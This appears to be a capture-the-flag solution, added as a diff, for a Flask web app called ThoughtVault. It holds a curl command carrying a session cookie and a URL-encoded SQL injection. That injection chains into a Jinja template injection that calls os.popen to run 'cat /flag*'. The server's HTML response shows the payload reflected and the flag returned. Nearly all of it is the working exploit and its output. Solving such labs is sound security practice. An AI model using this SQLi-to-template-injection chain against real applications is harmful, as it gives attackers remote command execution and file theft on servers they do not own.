@@ -1,0 +1,78 @@
+curl -g \
+  -b "session=eyJ1c2VybmFtZSI6ImxhenplciJ9.aSLNnQ.X07fpLVi0GhCGyf4hCkw10m1kKs" \
+"http://18.212.136.134:5001/search?topic=%27%20UNION%20SELECT%20%27%7B%7B%20request.application.__globals__.__builtins__.__import__%28%22os%22%29.popen%28%22cat%20%2Fflag*%22%29.read%28%29%20%7D%7D%27--%20-"
+
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>ThoughtVault</title>
+</head>
+<body>
+    <header>
+        <h1>ThoughtVault</h1>
+        <p>
+            <a href="/">home</a>
+            
+                | <a href="/bookmarks">bookmarks</a>
+                | <a href="/audit">audit</a>
+                | <a href="/reports">reports</a>
+                | <a href="/logout">logout</a>
+            
+        </p>
+    </header>
+    <hr>
+    
+        
+    
+    
+<section>
+    <h2>Lookup console</h2>
+    <form action="/search" method="get">
+        <input type="text" name="topic" value="&#39; UNION SELECT &#39;{{ request.application.__globals__.__builtins__.__import__(&#34;os&#34;).popen(&#34;cat /flag*&#34;).read() }}&#39;-- -" placeholder="topic" required>
+        <button type="submit">go</button>
+    </form>
+    
+    
+        <p>Ran: <code>SELECT content FROM messages WHERE topic = &amp;#x27;&amp;#x27; UNION SELECT &amp;#x27;{{ request.application.__globals__.__builtins__.__import__(&amp;quot;os&amp;quot;).popen(&amp;quot;cat /flag*&amp;quot;).read() }}&amp;#x27;-- -&amp;#x27;</code></p>
+    
+</section>
+
+<section>
+    <h3>Bookmarks</h3>
+    
+        <p>none saved yet</p>
+    
+</section>
+
+<section>
+    <h3>Recent</h3>
+    
+        <ul>
+            
+                <li>&#39; UNION SELECT &#39;{{ request.application.__globals__.__builtins__.__import__(&#34;os&#34;).popen(&#34;cat /flag*&#34;).read() }}&#39;-- - @ 2025-11-23 09:02:44</li>
+            
+        </ul>
+    
+</section>
+
+
+    <section>
+        <h3>Results</h3>
+        <ul>
+        
+            <li>PCTF{SQL1_C4n_b3_U53D_3Ff1C13N7lY}
+</li>
+        
+        </ul>
+        <form action="/bookmarks" method="post">
+            <input type="hidden" name="topic" value="&#39; UNION SELECT &#39;{{ request.application.__globals__.__builtins__.__import__(&#34;os&#34;).popen(&#34;cat /flag*&#34;).read() }}&#39;-- -">
+            <button type="submit">bookmark topic</button>
+        </form>
+    </section>
+
+
+</body>
+</html>
+                                                                 
